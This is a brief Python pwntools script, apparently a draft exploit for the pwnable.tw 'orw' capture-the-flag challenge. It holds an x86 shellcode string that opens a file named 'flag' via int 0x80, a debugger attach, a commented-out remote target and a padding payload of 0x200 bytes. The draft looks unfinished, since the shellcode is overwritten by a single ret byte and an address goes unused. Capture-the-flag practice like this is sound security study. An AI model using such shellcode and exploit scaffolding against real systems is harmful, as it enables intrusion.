#! /usr/bin/env python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
shellcode = "j\x05Xhflag1\xc9\x99T[\xcd\x80"
shellcode = "\xc3"
#p = remote("chall.pwnable.tw", 10000)
r_addr = 0x8048556
p = process("./orw")
gdb.attach(p, 'b main')
p.recv()
payload = "A"*0x200
p.send(payload)
p.interactive()
